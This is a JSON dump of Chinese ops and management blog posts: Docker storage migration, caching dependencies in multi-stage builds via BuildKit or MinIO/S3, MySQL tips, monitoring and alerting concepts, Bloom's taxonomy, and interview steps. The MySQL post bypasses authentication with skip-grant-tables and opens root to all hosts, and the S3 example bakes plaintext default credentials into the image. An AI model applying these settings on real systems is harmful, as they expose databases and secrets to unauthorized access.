/dev/sdb /data 开机自动挂载目录 先找到设备的 UUID。\n1 2 3 blkid |grep /dev/sdb /dev/sdb: UUID=\u0026#34;328a9d32-abb6-492a-aabe-b6a63583674d\u0026#34; TYPE=\u0026#34;ext4\u0026#34; 编辑 /etc/fstab 新增挂载项。\n1 2 3 vim /etc/fstab UUID=328a9d32-abb6-492a-aabe-b6a63583674d /dev/sdb ext4 defaults 0 0 2. 迁移 Docker 存储 暂停 Docker 1 systemctl stop docker 移动 Docker 存储数据 1 mv /var/lib/docker /data/ 创建新的链接 1 ln -s /data/docker /var/lib/docker 重启 Docker 1 systemctl start docker ","description":"","id":177,"section":"post","tags":["博文","Docker","运维","硬盘"],"title":"迁移 Docker 存储到新的硬盘","uri":"https://www.chenshaowen.com/blog/how-to-migrate-docker-storage-to-new-disk.html"},{"content":"\n非分阶段构建场景下，使用容器进行构建时，我们可以将容器中的缓存目录挂载到构建主机上，执行构建任务；然后将产物拷贝到运行镜像，制作应用镜像。但是在分阶段构建时，构建镜像和运行镜像在同一个 Dockerfile 中，这给优化第三方依赖的缓存带来了难度。\n1. 创建一个 Vue 实例项目 安装 Vue CLI 1 npm install -g @vue/cli --force 初始化示例项目 1 vue create hello-world 使用默认配置，创建示例项目: hello-world\n运行项目 此时，项目已经包含全部依赖，可以直接运行项目:\n1 npm run serve 删除依赖 依赖包通常不会提交到代码仓库，为了更好模拟构建情形，这里删除依赖，进行构建\n1 rm -rf node_modules 项目中添加 Dockerfile 文件 进入项目目录:\n1 cd hello-world 编辑并保存 Dockerfile 文件:\n1 2 3 4 5 6 7 8 9 10 11 12 13 vim Dockerfile FROM node:lts-alpine as builder WORKDIR / COPY package.json / RUN npm install COPY . . RUN npm run build FROM nginx:alpine COPY --from=builder /dist/ /usr/share/nginx/html/ EXPOSE 80 构建镜像 执行命令：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 docker build --no-cache -t shaowenchen/hello-world:v1 -f Dockerfile . [+] Building 139.2s (13/13) FINISHED =\u0026gt; [internal] load build definition from Dockerfile 2.6s =\u0026gt; =\u0026gt; transferring dockerfile: 228B 0.2s =\u0026gt; [internal] load .dockerignore 3.4s =\u0026gt; =\u0026gt; transferring context: 2B 0.0s =\u0026gt; [internal] load metadata for docker.io/library/nginx:alpine 4.2s =\u0026gt; [internal] load metadata for docker.io/library/node:lts-alpine 4.3s =\u0026gt; CACHED [builder 1/6] FROM docker.io/library/node:lts-alpine@sha256:2c6c59cf4d34d4f937ddfcf33bab9d8bbad8658d1b9de7b97622566a52167f2b 0.0s =\u0026gt; [internal] load build context 1.8s =\u0026gt; =\u0026gt; transferring context: 5.03kB 0.4s =\u0026gt; CACHED [stage-1 1/2] FROM docker.io/library/nginx:alpine@sha256:da9c94bec1da829ebd52431a84502ec471c8e548ffb2cedbf36260fd9bd1d4d3 0.0s =\u0026gt; [builder 2/6] COPY package.json / 5.3s =\u0026gt; [builder 3/6] RUN npm install 93.1s =\u0026gt; [builder 4/6] COPY . . 5.9s =\u0026gt; [builder 5/6] RUN npm run build 13.6s =\u0026gt; [stage-1 2/2] COPY --from=builder /dist/ /usr/share/nginx/html/ 4.0s =\u0026gt; exporting to image 4.0s =\u0026gt; =\u0026gt; exporting layers 2.3s =\u0026gt; =\u0026gt; writing image sha256:dc0f72b655eb95235b51d8fb30c430c3c1803c2d538d9948941f3e7afd23ab56 0.2s =\u0026gt; =\u0026gt; naming to docker.io/shaowenchen/hello-world:v1 0.2s 测试镜像 执行命令，创建容器:\n1 docker run --rm -it -p 80:80 shaowenchen/hello-world:v1 访问服务 在本地打开: http://localhost, 可以看到页面\n2. 利用 Buildkit 挂载缓存优化 这种方式的思路是，将第三方包单独存储在一个缓存镜像中，当构建应用镜像时，将缓存镜像中的文件挂载到构建环境中。\n2.1 开启 Buildkit Buildkit 默认是关闭的。有两种方式打开 Buildkit:\n第一种，在 /etc/docker/daemon.json 中增加 buildkit 配置，{ \u0026quot;features\u0026quot;: { \u0026quot;buildkit\u0026quot;: true }} 默认开启 buildkit 特性。 第二种，每次执行 docker 命令时，加上环境变量 DOCKER_BUILDKIT=1 。 2.2 使用 Bind 的方式挂载缓存 准备缓存镜像的 Dockerfile 创建 Dockerfile 文件:\n1 2 3 4 5 6 7 vim Dockerfile-Cache FROM node:lts-alpine as builder WORKDIR / COPY . . RUN npm install RUN npm run build 这里有一个小细节就是，需要 npm run build编译第三方包。仅仅缓存第三方包，是不能获得很好的加速效果的。同时，预编译能减少 CPU 和内存的消耗。\n编译包含第三方包的缓存镜像 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 docker build --no-cache -t shaowenchen/hello-world:cache -f Dockerfile-Cache . [+] Building 111.9s (9/9) FINISHED =\u0026gt; [internal] load build definition from Dockerfile-Cache 1.8s =\u0026gt; =\u0026gt; transferring dockerfile: 132B 0.0s =\u0026gt; [internal] load .dockerignore 2.9s =\u0026gt; =\u0026gt; transferring context: 2B 0.0s =\u0026gt; [internal] load metadata for docker.io/library/node:lts-alpine 4.2s =\u0026gt; [internal] load build context 1.7s =\u0026gt; =\u0026gt; transferring context: 4.57kB 0.2s =\u0026gt; CACHED [1/5] FROM docker.io/library/node:lts-alpine@sha256:2c6c59cf4d34d4f937ddfcf33bab9d8bbad8658d1b9de7b97622566a52167f2b 0.0s =\u0026gt; [2/5] COPY . . 3.6s =\u0026gt; [3/5] RUN npm install 69.2s =\u0026gt; [4/5] RUN npm run build 14.5s =\u0026gt; exporting to image 13.9s =\u0026gt; =\u0026gt; exporting layers 13.0s =\u0026gt; =\u0026gt; writing image sha256:e6ba7406f5d0c33d446ecc9a3c8e35fa593176ec9dedd899d39a1c00a14a5179 0.2s =\u0026gt; =\u0026gt; naming to docker.io/shaowenchen/hello-world:cache 0.2s 准备应用的构建 Dockerfile 文件 1 2 3 4 5 6 7 8 9 10 11 12 13 vim Dockerfile-Bind FROM node:lts-alpine as builder WORKDIR / COPY . . RUN --mount=type=bind,from=shaowenchen/hello-world:cache,source=/node_modules,target=/node_modules \\ --mount=type=bind,from=shaowenchen/hello-world:cache,source=/root/.npm,target=/root/.npm npm install RUN --mount=type=bind,from=shaowenchen/hello-world:cache,source=/node_modules,target=/node_modules \\ --mount=type=bind,from=shaowenchen/hello-world:cache,source=/root/.npm,target=/root/.npm npm run build FROM nginx:alpine COPY --from=builder /dist/ /usr/share/nginx/html/ EXPOSE 80 在每个使用缓存的命令前面都需要加 --mount 。\n编译应用镜像镜像 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 docker build --no-cache -t shaowenchen/hello-world:v1-bind -f Dockerfile-Bind . [+] Building 55.3s (13/13) FINISHED =\u0026gt; [internal] load build definition from Dockerfile-Bind 2.5s =\u0026gt; =\u0026gt; transferring dockerfile: 42B 0.0s =\u0026gt; [internal] load .dockerignore 3.4s =\u0026gt; =\u0026gt; transferring context: 2B 0.0s =\u0026gt; [internal] load metadata for docker.io/library/nginx:alpine 4.0s =\u0026gt; [internal] load metadata for docker.io/library/node:lts-alpine 3.8s =\u0026gt; [internal] load build context 2.4s =\u0026gt; =\u0026gt; transferring context: 4.47kB 0.2s =\u0026gt; CACHED FROM docker.io/shaowenchen/hello-world:cache 0.3s =\u0026gt; CACHED [stage-1 1/2] FROM docker.io/library/nginx:alpine@sha256:da9c94bec1da829ebd52431a84502ec471c8e548ffb2cedbf36260fd9bd1d4d3 0.0s =\u0026gt; CACHED [builder 1/5] FROM docker.io/library/node:lts-alpine@sha256:2c6c59cf4d34d4f937ddfcf33bab9d8bbad8658d1b9de7b97622566a52167f2b 0.0s =\u0026gt; [builder 2/5] COPY . . 4.2s =\u0026gt; [builder 3/5] RUN --mount=type=bind,from=shaowenchen/hello-world:cache,source=/node_modules,target=/node_modules --mount=type=bind,from=shaowenchen/hello-world:cache 16.8s =\u0026gt; [builder 4/5] RUN --mount=type=bind,from=shaowenchen/hello-world:cache,source=/node_modules,target=/node_modules --mount=type=bind,from=shaowenchen/hello-world:cache 13.2s =\u0026gt; [stage-1 2/2] COPY --from=builder /dist/ /usr/share/nginx/html/ 3.7s =\u0026gt; exporting to image 4.8s =\u0026gt; =\u0026gt; exporting layers 3.1s =\u0026gt; =\u0026gt; writing image sha256:de18663c5752a41cd61c23fb2cbbc1ac9c4c79cf5fdbe15ca16e806d0ce18d9d 0.2s =\u0026gt; =\u0026gt; naming to docker.io/shaowenchen/hello-world:v1-bind 0.1s 可以看到，加缓存之后，执行 install 和 build 总时长从 100 多秒降到了不到 30 秒。\n3. 利用 S3 存储缓存优化 3.1 快速部署一个 minio 参考文件: Jenkins 中的构建产物与缓存\n3.2 配置秘钥 在 hello-world 目录下创建凭证文件 .s3cfg 。\nhost_base = 1.1.1.1:9000 host_bucket = 1.1.1.1:9000 use_https = False access_key = minio secret_key = minio123 signature_v2 = False 3.3 改造 Dockerfile 适配 S3 缓存 这里主要的工作点在:\n安装 s3cmd 获取并解压缓存，忽略错误（第一次为空） \u0026hellip; 安装依赖，进行构建 压缩并上传缓存 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 vim Dockerfile-S3 FROM node:lts-alpine as builder ARG BUCKETNAME ENV BUCKETNAME=$BUCKETNAME RUN apk add python3 \u0026amp;\u0026amp; ln -sf python3 /usr/bin/python \u0026amp;\u0026amp; apk add py3-pip RUN wget https://sourceforge.net/projects/s3tools/files/s3cmd/2.2.0/s3cmd-2.2.0.tar.gz \\ \u0026amp;\u0026amp; mkdir -p /usr/local/s3cmd \u0026amp;\u0026amp; tar -zxf s3cmd-2.2.0.tar.gz -C /usr/local/s3cmd \\ \u0026amp;\u0026amp; ln -s /usr/local/s3cmd/s3cmd-2.2.0/s3cmd /usr/bin/s3cmd \u0026amp;\u0026amp; pip3 install python-dateutil WORKDIR / # Get Cache COPY .s3cfg /root/ RUN s3cmd get s3://$BUCKETNAME/node_modules.tar.gz \u0026amp;\u0026amp; tar xf node_modules.tar.gz || exit 0 RUN s3cmd get s3://$BUCKETNAME/npm.tar.gz \u0026amp;\u0026amp; tar xf npm.tar.gz || exit 0 COPY . . RUN npm install RUN npm run build # Uploda Cache RUN s3cmd del s3://$BUCKETNAME/node_modules.tar.gz || exit 0 RUN s3cmd del s3://$BUCKETNAME/npm.tar.gz || exit 0 RUN tar cvfz node_modules.tar.gz node_modules RUN tar cvfz npm.tar.gz ~/.npm RUN s3cmd put node_modules.tar.gz s3://$BUCKETNAME/ RUN s3cmd put npm.tar.gz s3://$BUCKETNAME/ FROM nginx:alpine COPY --from=builder /dist/ /usr/share/nginx/html/ EXPOSE 80 首次使用 S3 缓存构建应用镜像 构建之前，需要提前创建一个名为 hello-world 的 Bucket。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 docker build --no-cache --build-arg BUCKETNAME=\u0026#34;hello-world\u0026#34; -t shaowenchen/hello-world:v1-s3 -f Dockerfile-S3 . [+] Building 244.7s (23/23) FINISHED =\u0026gt; [internal] load build definition from Dockerfile-S3 1.7s =\u0026gt; =\u0026gt; transferring dockerfile: 40B 0.1s =\u0026gt; [internal] load .dockerignore 2.6s =\u0026gt; =\u0026gt; transferring context: 2B 0.1s =\u0026gt; [internal] load metadata for docker.io/library/nginx:alpine 2.6s =\u0026gt; [internal] load metadata for docker.io/library/node:lts-alpine 0.0s =\u0026gt; CACHED [builder 1/16] FROM docker.io/library/node:lts-alpine 0.0s =\u0026gt; [internal] load build context 2.2s =\u0026gt; =\u0026gt; transferring context: 4.53kB 0.1s =\u0026gt; CACHED [stage-1 1/2] FROM docker.io/library/nginx:alpine@sha256:da9c94bec1da829ebd52431a84502ec471c8e548ffb2cedbf36260fd9bd1d4d3 0.0s =\u0026gt; [builder 2/16] RUN apk add python3 \u0026amp;\u0026amp; ln -sf python3 /usr/bin/python \u0026amp;\u0026amp; apk add py3-pip 32.3s =\u0026gt; [builder 3/16] RUN wget https://sourceforge.net/projects/s3tools/files/s3cmd/2.2.0/s3cmd-2.2.0.tar.gz \u0026amp;\u0026amp; mkdir -p /usr/local/s3cmd \u0026amp;\u0026amp; tar -zxf s3cmd-2.2.0.tar.g 12.8s =\u0026gt; [builder 4/16] COPY .s3cfg /root/ 5.8s =\u0026gt; [builder 5/16] RUN s3cmd get s3://hello-world/node_modules.tar.gz \u0026amp;\u0026amp; tar xf node_modules.tar.gz || exit 0 6.7s =\u0026gt; [builder 6/16] RUN s3cmd get s3://hello-world/npm.tar.gz \u0026amp;\u0026amp; tar xf npm.tar.gz || exit 0 7.3s =\u0026gt; [builder 7/16] COPY . . 5.7s =\u0026gt; [builder 8/16] RUN npm install 71.3s =\u0026gt; [builder 9/16] RUN npm run build 14.4s =\u0026gt; [builder 10/16] RUN s3cmd del s3://hello-world/node_modules.tar.gz || exit 0 7.5s =\u0026gt; [builder 11/16] RUN s3cmd del s3://hello-world/npm.tar.gz || exit 0 6.9s =\u0026gt; [builder 12/16] RUN tar cvfz node_modules.tar.gz node_modules 11.3s =\u0026gt; [builder 13/16] RUN tar cvfz npm.tar.gz ~/.npm 9.4s =\u0026gt; [builder 14/16] RUN s3cmd put node_modules.tar.gz s3://hello-world/ 14.8s =\u0026gt; [builder 15/16] RUN s3cmd put npm.tar.gz s3://hello-world/ 15.9s =\u0026gt; [stage-1 2/2] COPY --from=builder /dist/ /usr/share/nginx/html/ 4.5s =\u0026gt; exporting to image 3.9s =\u0026gt; =\u0026gt; exporting layers 2.5s =\u0026gt; =\u0026gt; writing image sha256:dceead698b2c5f3980bf17f246078fe967dda2d9b009c30d9fdb0c60263146e5 0.1s =\u0026gt; =\u0026gt; naming to docker.io/shaowenchen/hello-world:v1-s3 0.2s 在 Minio 的 UI 端可以看到相关的缓存文件：\n再次使用 S3 缓存构建应用镜像 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 docker build --no-cache --build-arg BUCKETNAME=\u0026#34;hello-world\u0026#34; -t shaowenchen/hello-world:v1-s3 -f Dockerfile-S3 . [+] Building 213.8s (23/23) FINISHED =\u0026gt; [internal] load build definition from Dockerfile-S3 2.0s =\u0026gt; =\u0026gt; transferring dockerfile: 40B 0.0s =\u0026gt; [internal] load .dockerignore 2.7s =\u0026gt; =\u0026gt; transferring context: 2B 0.0s =\u0026gt; [internal] load metadata for docker.io/library/nginx:alpine 4.6s =\u0026gt; [internal] load metadata for docker.io/library/node:lts-alpine 0.0s =\u0026gt; CACHED [builder 1/16] FROM docker.io/library/node:lts-alpine 0.0s =\u0026gt; CACHED [stage-1 1/2] FROM docker.io/library/nginx:alpine@sha256:da9c94bec1da829ebd52431a84502ec471c8e548ffb2cedbf36260fd9bd1d4d3 0.0s =\u0026gt; [internal] load build context 1.9s =\u0026gt; =\u0026gt; transferring context: 4.53kB 0.1s =\u0026gt; [builder 2/16] RUN apk add python3 \u0026amp;\u0026amp; ln -sf python3 /usr/bin/python \u0026amp;\u0026amp; apk add py3-pip 30.9s =\u0026gt; [builder 3/16] RUN wget https://sourceforge.net/projects/s3tools/files/s3cmd/2.2.0/s3cmd-2.2.0.tar.gz \u0026amp;\u0026amp; mkdir -p /usr/local/s3cmd \u0026amp;\u0026amp; tar -zxf s3cmd-2.2.0.tar.g 13.2s =\u0026gt; [builder 4/16] COPY .s3cfg /root/ 5.5s =\u0026gt; [builder 5/16] RUN s3cmd get s3://hello-world/node_modules.tar.gz \u0026amp;\u0026amp; tar xf node_modules.tar.gz || exit 0 16.7s =\u0026gt; [builder 6/16] RUN s3cmd get s3://hello-world/npm.tar.gz \u0026amp;\u0026amp; tar xf npm.tar.gz || exit 0 15.3s =\u0026gt; [builder 7/16] COPY . . 4.7s =\u0026gt; [builder 8/16] RUN npm install 18.4s =\u0026gt; [builder 9/16] RUN npm run build 13.6s =\u0026gt; [builder 10/16] RUN s3cmd del s3://hello-world/node_modules.tar.gz || exit 0 7.4s =\u0026gt; [builder 11/16] RUN s3cmd del s3://hello-world/npm.tar.gz || exit 0 7.9s =\u0026gt; [builder 12/16] RUN tar cvfz node_modules.tar.gz node_modules 10.8s =\u0026gt; [builder 13/16] RUN tar cvfz npm.tar.gz ~/.npm 10.0s =\u0026gt; [builder 14/16] RUN s3cmd put node_modules.tar.gz s3://hello-world/ 17.9s =\u0026gt; [builder 15/16] RUN s3cmd put npm.tar.gz s3://hello-world/ 16.3s =\u0026gt; [stage-1 2/2] COPY --from=builder /dist/ /usr/share/nginx/html/ 5.0s =\u0026gt; exporting to image 3.8s =\u0026gt; =\u0026gt; exporting layers 2.5s =\u0026gt; =\u0026gt; writing image sha256:a9c46eef6073b3ef8e6c4cd33cc1ed11c94dcebdb0883c89283883d9434de331 0.2s =\u0026gt; =\u0026gt; naming to docker.io/shaowenchen/hello-world:v1-s3 0.2s 可以看到，install 和 build 命令大约需要 80 秒，但是 S3 缓存相关的操作占用了大约 50 秒。\n其中的 80 秒还可以优化的地方是，构建环境和 S3 服务之间网络限速为 1.2 MB/S 导致拉取和推送占用时间过长，就有较大优化空间。我认为在 30 秒以内，比较合理。\n4. 总结 缓存加速是 CI 产品的一个难点。用户使用的方式各不相同，我们能做的是针对用户的场景提供解决方案，而不能强制改变用户的使用习惯。在我之前开发的 CI 产品中，主要是将主机上的缓存挂载到构建环境中加速，无法适用分阶段构建的场景。这里主要提供了两个方案:\n第一种，开启 Buildkit 特性，将第三方依赖包存储在缓存镜像。缓存镜像可以根据策略，定时进行更新。构建镜像时，挂载缓存镜像中的第三方包。\n第二种，使用 S3 存储第三方依赖包，在构建时，使用 s3cmd 命令管理缓存。\n以上两种方式，都不算很好。主要的原因是，它们都需要对 Dockerfile 进行修改，对业务的入侵较大。\n5. 参考 https://yeasy.gitbook.io/docker_practice/buildx/buildkit ","description":"","id":178,"section":"post","tags":["博文","CICD","CI","DevOps","缓存","优化"],"title":"分阶段构建如何缓存第三方依赖","uri":"https://www.chenshaowen.com/blog/how-to-cache-third-party-package-whilie-building-in-stage.html"},{"content":"1. 免密登录 修改 /etc/my.cnf，在 [mysqld] 中添加一行： skip-grant-tables=1 重启 mysqld 服务 1 systemctl restart mysqld 使用 root 用户登录到 MySQL 1 mysql -u root 2. 允许全部访问来源 登录 MySQL 1 mysql -u root -p 在 mysql 交互命令行中输入:\n1 2 3 4 USE mysql; SELECT user, host FROM user; update user set host = \u0026#39;%\u0026#39; where user = \u0026#39;root\u0026#39;; FLUSH PRIVILEGES; 3. 导出全部数据 1 mysqldump -uroot -proot --all-databases \u0026gt;/tmp/all.sql ","description":"","id":179,"section":"post","tags":["博文","MySQL","脚本"],"title":"常用的一些 MYSQL 命令","uri":"https://www.chenshaowen.com/blog/some-common-scripts-while-using-mysql.html"},{"content":"监控系统的难点在于，存储大容量时序数据，提供高性能的查询能力；告警系统的难点在于，设计高效的告警引擎，实现灵活的告警升级机制。最近一直在跟踪监控告警系统，本篇主要是整理监控告警相关的一些概念、组件，调研方案。\n1. 监控告警系统的组成 对于监控告警的定义，每个人都会有一些自己的理解。我的理解是: 监控是将发生的事情记录下来，以供事前事后分析；告警是当非预期的事情发生时，能够及时告知。\n如上图，一个监控告警系统会包含如下几个部分:\nAgent - 负责采集，并将关注的指标数据上报\nStorage - 负责存储 Agent 上报的数据\nAlarm - 负责检测上报的数据是否达到预设的阈值\nNotification - 负责将告警发送给指定的接收人\n2. 采集 2.1 采集的数据格式 不同于传统的关系型数据库，监控指标的数据实际上是基于时间的抽样，适合使用时序数据库进行存储。目前主流的时序数据库，大多数都是采用 Metric 加 Tag 的方式，来描述一条监控指标，Tag 的作用是标记指标的维度信息。下面是一条监控数据:\napi_http_requests_total{path=\u0026#34;/home\u0026#34;,status=200,method=\u0026#34;GET\u0026#34;,instance=\u0026#34;10.10.12.11\u0026#34;} 其中，时序的名字为 api_http_requests_total，标签为 path、status、method 和 instance，时序名字和标签共同决定了一个时序。\n因此，我们才可以根据 status Tag 统计状态码的分布，根据 method Tag 统计请求方法的比例。\n2.2 采集组件 Exporter Exporter 通过 http 服务暴露指标数据给采集方抓取，比如暴露给 Pormetheus。Exporter 不会存储历史数据，只会等待采集方抓取时，提供最近一次的数据。\n在开源社区中，已经有各种主机、中间的 Exporter 可供使用，非常方便。\n2.3 AllInOne 的 Exporter - Telegraf 使用 Exporter 让人烦恼的地方在于，主机有一个 Exporter、MySQL 有一个 Exporter，如果运维组件很多，Exporter 的维护成本很高。\nTelegraf 采用了类似 Logstash 的 Pipeline 方式，使用 input、output 以及 processor 插件组装采集能力。因此，我们只需要使用一个 Telegraf + 多种配置文件就可以替代多种 Exporter，大大降低了维护的成本。\n但另一方面，由于 Telegraf 包含的采集器太多，会导致可执行文件过大。因此，有时我们也会裁剪 Telegraf，去掉用不上的部分，以维持可执行文件足够小。\n2.4 Pushgateway 补充推送场景 Exporter 只是提供 http 接口，被动等待采集。但是有些场景下，需要主动推送指标数据，比如短生命周期的 Job 任务，等不到采集方抓取就被销毁了。这时，Pushgateway 就能够接受 Job 主动推送的监控数据，再等待采集方的抓取。\n另外一个场景是，如果所有 Exporter 都在采集方配置采集端点，会导致采集方配置难以维护。因此，也可以使用 Pushgateway 提前将数据聚合，再提供给采集方。这样可以减少采集方维护采集端点的成本。\n还有一个场景是，Exporter 与采集方的网络不可靠时，需要通过 Pushgateway 进行中转。\n3. 存储 3.1 时序数据库的特征 监控数据的特征是与时间序列强相关，因此需要使用的是时序数据库。市面上已经有大量开源的产品可以使用，InfluxDB、OpenTSDB、M3DB 等，这些时序数据库碰到的核心问题是 垂直写，水平读 。\n如上图所示，我们在采集指标时，每次采集的是某一个时刻的数据，但是在查询时却又基于某一个 Metric 指标进行统计，基于 Tag 进行过滤查询。这种使用方式，给时序数据库的设计和实现带来了挑战。既要能快速存储大量垂直指标数据，又要能够快速查询水平数据。\n3.2 Prometheus Prometheus 是前 Google 工程师在 Soundcloud 开源的监控告警项目。目前，大部分公司都会采用 Pormetheus 作为监控告警工具。\nPrometheus 的特点是：既有数据存储，也有告警引擎。因此，只需要部署一套 Pormetheus 就可以开箱即用，满足大部分的监控场景。\nPrometheus 的问题是：服务单点，使用文件配置规则。当单点的 Prometheus 重启或抓取 Exporter 数据故障时，都会导致监控数据缺失。因此，生产环境下，有时也会采用两套 Prometheus 同时抓取 Exporter 指标数据的方案。\n3.3 为啥要远端存储 Prometheus 为了降低自身的复杂度，使用了本地存储，足以满足大部分用户规模的监控场景，但无法满足对长期数据的查询需求。因此，在业务规模较大时，我们会将 Prometheus 的本地数据作为临时数据，而将长期数据转存到远端。\n最终，针对近期数据的告警查询，使用的是 Prometheus; 而历史数据的统计查询，使用的是远端存储。这里介绍三种远端存储方案：\nInfluxDB InfluxDB 在时序数据库排名中，长期占据第一。InfluxDB 的集群模式需要收费，单例模式源码开源。我们可以将 Prometheus 的 remote write 到 InfluxDB，当 Grafana 从 Prometheus 进行长期查询时，使用 InfluxQL 查询 InfluxDB，进行短期查询时，使用 PromQL 查询 Prometheus。\nVictoriaMetrics VictoriaMetrics 也分为单机版和集群版。VictoriaMetrics 并不是 100 % 兼容 PromQL 查询语句。如果没有用到告警，单机版的 VictoriaMetrics 可以直接用于替换 Prometheus，也可以作为 Prometheus 的远端存储使用。VictoriaMetrics 也提供了集群模式，包含 vmagent、vmstorage、vminsert、vmselect、vmalert 组件，实现了一整套高可用、存储可扩展的监控告警方案。\nThanos Thanos 的定位是监控终结者，得到社区大力推荐。Thanos 包含 Querier、Slidercar、Store、Compactor 组件，通过在 Prometheus 上挂载 Sidecar 上报数据并提供查询能力。Thanos 会将监控数据存储到 S3，同时 Compator 还会对数据进行采样。这样的好处是，在查询长期数据时，可以先查 S3 采样的数据展示结果，而不是读取全量数据。\n4. 分析 当指标上报、数据进入时序数据库之后，我们就需要不断地查询分析，指标是否符合预期，或者查看长期数据。\n数据检测的过程就是不断地调用接口查询的过程。如果用代码实现，就是一个循环。但其中有很多的细节需要考虑：\nnodata 没有数据的原因可能是服务没有上报数据，也有可能是上报链路异常，还可能是查询时异常。这种情况下，如何处理？常见的有两种处理方式：1，nodata 上报特殊数值；2，单独实现 nodata 的检测。\n大量检测 当配置的每分钟检测规则达到一定数量级时，单个时序数据库扛不住。这里就会衍生出一些优化的方案，比如使用集群分担查询、在检测时刻 BIAS 几秒错峰等。还有一种方案是，使用 Redis 等高性能数据库临时存储短期指标数据，用于告警检测。\n5. 告警 分析阶段会产生大量告警事件，这些事件如果直接推送给用户，将会产生大量垃圾信息。告警模块的目的是为了提高通知的价值密度，让用户能够准确高效地获知线上故障。\n告警规则的管理 告警规则提供了分析阶段需要的查询语句。怎样高效地管理这些告警规则，是告警系统需要解决的问题之一。\n告警实例的管理 在监控数据达到告警规则阈值时，就会产生一个告警实例。我们需要对告警实例进行管理。告警实例状态会发生流转，正在告警、恢复、未处理。\nAlertmanager 社区中很多方案都会使用 Prometheus + Alertmanager 的告警组合，使用 helm 部署 Prometheus 时，也可以很方便地部署全套方案。\nPrometheus 提供的告警引擎，在检测到异常时，会将告警推送给 Alertmanager 。Alertmanager 会根据路由配置，将告警发送给指定的接收人。Altermanager 也是采用文件配置规则。\n6. 参考 https://toutiao.io/posts/lha0c8/preview https://www.163.com/dy/article/FCEQU6210511CUTF.html https://segmentfault.com/a/1190000040480428 https://zyun.360.cn/blog/?p=1536 https://github.com/prometheus/cloudwatch_exporter https://github.com/huaweicloud/cloudeye-exporter https://n9e.github.io/quickstart/standalone/ http://mysql.taobao.org/monthly/2018/02/02/ https://zhuanlan.zhihu.com/p/155719693 ","description":"","id":180,"section":"post","tags":["整理","监控","告警"],"title":"监控告警系统概述","uri":"https://www.chenshaowen.com/blog/monitor-and-alarm-system-101.html"},{"content":"1. 布卢姆分类学 布卢姆分类学 (Bloom\u0026rsquo;s taxonomy) 是美国教育心理学家本杰明·布鲁姆于1956年在芝加哥大学所提出的分类法，把教育者的教学目标分类，以便更有效的达成各个目标。根据布卢姆的理论析，知识可以分成以下三个范畴：\n态度范畴（Affective Domain） 技巧范畴（Psychomotor Domain） 认知范畴（Cognitive Domain） 每一范畴对应于学习的不同层次，而较高层次对应学科内较复杂的内容，亦距离对该学科的通达（Mastery，台湾译作精熟）的距离亦较接近。布卢姆分类学的最终目标，是要鼓励教学者对教学的三个范畴都要有所聚焦，以达至整全（holistic）的教育。\n2. 态度范畴 态度范畴描述人们在情感方面的反应方式、以及他们感受其他生物的苦痛与快乐的能力。态度方面的目标通常针对于态度、情感及感受方面的觉醒与成长。\n态度范畴内的过程从低至高可分为五个层次：\n2.1 接受（Receiving） 接受是态度范畴内最低层次的过程，学生是被动的要求专注。若连这一层次也不能达到的话，可以说根本毫无学习可言。\n2.2 反应（Responding） 在这层次，学生不单只对于刺激作出反应，更可主动参与学习过程。\n2.3 评价（Valuing） 学生可对一件物件、一个现象或一份信息给予评价。\n2.4 组织（Organizing） 学生把不同的价值、信息及意念摆在一起，并利用他们本身的schema来将他们容纳在一起。比较、关联和引申所学过的内容。\n2.5 内化（Characterizing） 学生已将所学视为一种本能。\n3. 技巧范畴 技巧范畴描述人们在真实的使用一件工具或仪器，例如捶子的能力。技巧范畴的目的通常专注于改变及行为与技巧的开发。\n4. 认知范畴 认知范畴包括以下六种：\n4.1 记忆 (Remember) 记忆指的是对于数据或信息的回忆。例如：\n4.2 理解 (Comprehension) 表现出理解的事实和思想，组织，比较，翻译，解释，提供描述，并阐明的主要观点 翻译 解释 外推法 比如这样的问题：吃苹果与桔子比较健​​康的好处。\n4.3 应用 (Application) 使用新的知识。在新形势下，以不同的方式运用所学到的知识、事实、技术和规则解决问题。 比如这样的问题：哪种苹果是最合适的烤馅饼的一种，为什么？\n4.4 分析 (Analysis) 检查并分析动机或原因，后分解信息分成几部分。进行推论，并找到证据支持的概括 元素分析 关系分析 组织原则分析 比如这样的问题：列出与苹果制成的食品四个方面的服务，并说明哪些有最佳的健康的益处。然后提供参考资料，以支持你的陈述。\n4.5 评价 (Evaluation) 评价（使用标准、理论或过程来评价价值）：评价，表明，证明，评定，测试，判断，等级，测量，鉴定，挑选，检查，辩护，确定，支持，维护，批评，评论，衡量，评估，选择，比较，对比，决定，估计，等级，比率，修改，评分，协调，辩论，演绎，归纳，推荐，监测，得出结论，区分，解释（为什么），解释，关系，总结问题，挑战，提倡，说服\n4.6 创造 (Create) 创造出新的或是原创的成果: 设计、组合、组织与结构、推理或推测、发展、制定、创作、调查出新的知识或是讯息\n","description":"","id":181,"section":"post","tags":["整理","通识"],"title":"布鲁姆分类学","uri":"https://www.chenshaowen.com/blog/taxonomy-of-educational-objectives.html"},{"content":"1. 面试流程 建立招人标准 对齐招人标准 简历分析 开场寒暄 胜任力评估 价值观评估 辨别真伪 动机评估 吸引优秀候选人 结束面试 填写面试评估表 协助入职跟进 2. 面试前 2.1 建立招人标准 why 使用统一的考核标准评估候选人\nhow 冰山模型，冰山上-当前（知识、技能），冰山下-未来（价值观、社会角色、自信、个性、动机）。\n根据当前团队的状态、人员配比决定，选择当前高绩效，还是未来高绩效。\nwhat 当前高绩效：\n知识，在这个领域知道的多\n绩效，在这个领域做的好\n未来高绩效：\n价值观-立场: 组织利益优先于个人利益，长期利益优先于短期利益\n自信-行动力: 愿意探索未知领域，把失败当成经历而非结果\n个人-适应性: 调整自我风格，切换风格的速度\n动机-优先级: 需不需要，喜不喜欢\n2.2 对齐招人标准 对齐有效简历的获取渠道 对齐简历筛选的关键字 2.3 面试分工 一面，能干活\n二面，可培养\n2.4 简历分析 空白期 休假原因、计划做什么\n跳槽增值期 几流跳几流、转行难度、是否增值\n加速度 职级跳跃性阶段\n自我评价 